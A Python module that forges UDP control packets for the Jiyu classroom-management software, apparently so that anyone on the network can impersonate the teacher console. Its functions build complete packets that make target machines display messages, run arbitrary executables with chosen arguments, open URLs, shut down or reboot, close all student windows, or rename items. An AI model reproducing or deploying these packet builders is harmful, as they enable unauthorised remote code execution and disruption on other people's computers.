"""
This module is used to forge Jiyu UDP packets.
"""

import secrets

from typing import Literal, Optional


def format_data(data: str, max_length: Optional[int] = None) -> bytes:
    """
    Formats a string into a byte array, ensuring it is within the specified maximum length.

    Args:
        msg (str): The input string to format.
        max_length (int, optional): The maximum length of the output byte array.

    Returns:
        bytes: The formatted byte array, padded with null bytes if necessary.
    """
    if not isinstance(data, str):
        raise TypeError(f"Expected string, got {type(data).__name__}")
    if max_length is None:
        return data.encode("utf-16le")
    if not isinstance(max_length, int):
        raise TypeError(f"Expected int, got {type(max_length).__name__}")
    if max_length <= 0:
        raise ValueError(f"Invalid maximum length: {max_length}")
    padded_bytes = data.encode("utf-16le").ljust(max_length, b"\x00")
    if len(padded_bytes) > max_length:
        raise ValueError(f"Data exceeds maximum length: {len(padded_bytes)} > {max_length}")
    return padded_bytes


def pkg_message(msg: str) -> bytes:
    """
    Packages a message string into a specific byte format, including a header and padding.

    Args:
        msg (str): The message string to package.

    Returns:
        bytes: The packaged message as a byte array, including a header and padding.
    """
    data = format_data(msg, 800)
    head = (
        b"DMOC\x00\x00\x01\x00\x9e\x03\x00\x00"
        + secrets.token_bytes(16)
        + b" N\x00\x00\xc0\xa8l\x01\x91\x03\x00\x00"
        + b"\x91\x03\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00"
    )
    return head + data + b"\x00" * 98


def pkg_execute(
    executable_file: str,
    arguments: str = "",
    mode: Literal["normal", "minimize", "maximize"] = "normal",
) -> bytes:
    """
    Packages a command with an executable file and optional arguments into a specific byte format.

    Args:
        executable_file (str): The name of the executable file to run.
        arguments (str, optional): The command-line arguments to pass to the executable. Defaults to an empty string.
        mode (Literal["normal", "minimize", "maximize"], optional): The mode of execution. Defaults to "normal".

    Returns:
        bytes: The packaged command as a byte array, including a header and formatted data.
    """
    head = (
        b"DMOC\x00\x00\x01\x00n\x03\x00\x00"
        + secrets.token_bytes(16)
        + b" N\x00\x00\xc0\xa8\xe9\x01a\x03\x00\x00a\x03\x00\x00"
        + b"\x00\x02\x00\x00\x00\x00\x00\x00\x0f\x00\x00\x00\x01\x00\x00\x00"
    )
    data0 = format_data(executable_file, 512)
    data1 = format_data(arguments, 254)
    match mode:
        case "normal":
            data2 = b"\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        case "minimize":
            data2 = b"\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        case "maximize":
            data2 = b"\x02\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        case _:
            raise ValueError(f"Invalid mode: {mode}")
    return head + data0 + data1 + b"\x00" * 66 + data2


def pkg_website(url: str) -> bytes:
    """
    Packages a website URL into a specific byte format, including a header and padding.

    Args:
        url (str): The website URL to package.

    Returns:
        bytes: The packaged URL as a byte array, including a header and padding.
    """
    data = format_data(url)

    head = (
        b"DMOC\x00\x00\x01\x00"
        + (len(data) + 36).to_bytes(4, "little")
        + secrets.token_bytes(16)
        + b" N\x00\x00\xc0\xa8\xe9\x01"
        + (len(data) + 23).to_bytes(4, "little")
        + (len(data) + 23).to_bytes(4, "little")
        + b"\x00\x02\x00\x00\x00\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00"
    )

    return head + data + b"\x00" * 4


def pkg_shutdown(timeout: Optional[int] = None, message: str = "", reboot: bool = False) -> bytes:
    """
    Packages a shutdown or reboot command into a specific byte format, including a header and formatted data.

    Args:
        timeout (Optional[int]): The time in seconds before the shutdown or reboot occurs. If None, it defaults to immediate execution.
        message (str): The message to display during the shutdown or reboot process.
        reboot (bool): If True, the command will initiate a reboot; if False, it will initiate a shutdown.

    Returns:
        bytes: The packaged shutdown or reboot command as a byte array, including a header and formatted data.
    """
    head = (
        b"DMOC\x00\x00\x01\x00*\x02\x00\x00"
        + secrets.token_bytes(16)
        + b" N\x00\x00\xc0\xa8\xe9\x01\x1d\x02\x00\x00\x1d\x02\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00"
        + (b"\x13\x00" if reboot else b"\x14\x00")
        + (b"\x00\x10" if timeout is None else b"\x00\x00")
        + (timeout or 0).to_bytes(4, "little")
        + b"\x01\x00\x00\x00\x00\x00\x00\x00"
    )
    data = format_data(message, 256)
    return head + data + b"\x00" * 258


def pkg_close_windows(timeout: Optional[int] = None, message: str = "") -> bytes:
    """
    Packages a command to close all student windows into a specific byte format, including a header and formatted data.

    Args:
        timeout (Optional[int]): The time in seconds before the windows are closed. If None, it defaults to immediate execution.
        message (str): The message to display during the window closing process.

    Returns:
        bytes: The packaged close windows command as a byte array, including a header and formatted data
    """
    head = (
        b"DMOC\x00\x00\x01\x00*\x02\x00\x00"
        + secrets.token_bytes(16)
        + b" N\x00\x00\xc0\xa8\xe9\x01\x1d\x02\x00\x00\x1d\x02\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x02\x00"
        + (b"\x00\x10" if timeout is None else b"\x00\x00")
        + (timeout or 0).to_bytes(4, "little")
        + b"\x01\x00\x00\x00\x00\x00\x00\x00"
    )
    data = format_data(message, 256)
    return head + data + b"\x00" * 258


def pkg_rename(name: str, name_id: int = 0) -> bytes:
    """
    Packages a command to rename a file or directory into a specific byte format, including a header.

    Args:
        name (str): The new name for the file or directory.
        name_id (int, optional): An identifier for the name. Defaults to 0.

    Returns:
        bytes: The packaged rename command as a byte array, including a header and formatted data.
    """
    head = b"GCMN\x00\x00\x01\x00D\x00\x00\x00f\xb1\xe4\x92?\x9a6J\x94:=\xa3\xbd\x97`A" + name_id.to_bytes(4, "little")
    data = format_data(name + "\x00", 64)
    return head + data
